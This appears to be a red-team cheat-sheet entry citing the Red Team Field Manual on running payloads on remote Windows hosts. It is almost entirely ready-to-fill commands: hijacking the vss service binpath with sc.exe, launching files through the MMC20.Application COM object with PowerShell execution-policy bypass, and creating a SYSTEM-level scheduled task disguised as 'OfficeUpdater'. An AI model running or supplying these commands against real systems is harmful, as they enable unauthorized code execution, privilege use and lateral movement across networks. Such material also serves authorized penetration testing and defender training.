---
name: Windows Remote Execution
category: Post-Exploitation & PrivEsc
description: Remote code execution on Windows — sc.exe service manipulation, MMC COM object, and schtasks techniques.
tags: [windows, remote-execution, lateral-movement, sc, schtasks, RTFM]
---

# Windows Remote Execution

Techniques for executing payloads on remote Windows systems using built-in tools.

## sc.exe remote execution

Upload binary, modify an existing service to point at it, start the service, then restore.

```batch
sc \\<IP> qc vss
sc \\<IP> query vss
sc \\<IP> config vss binpath= "<FILE_PATH>"
sc \\<IP> qc vss
sc \\<IP> start vss
sc \\<IP> stop vss
sc \\<IP> config vss binpath= "<ORIGINAL_PATH>"
sc \\<IP> qc vss
```

## MMC COM object

Only works against Windows Server targets.

```powershell
powershell -ep bypass -nop -Command ([activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<IP>"))).Document.ActiveView.ExecuteShellCommand("<FILE_PATH>",$null,$null,"7")
```

## Remote schtasks execution

```batch
schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH> /s <IP>
schtasks /query /tn OfficeUpdater /fo list /v /s <IP>
schtasks /run /tn OfficeUpdater /s <IP>
schtasks /delete /tn OfficeUpdater /f /s <IP>
```

> Source: RTFM — Red Team Field Manual v2
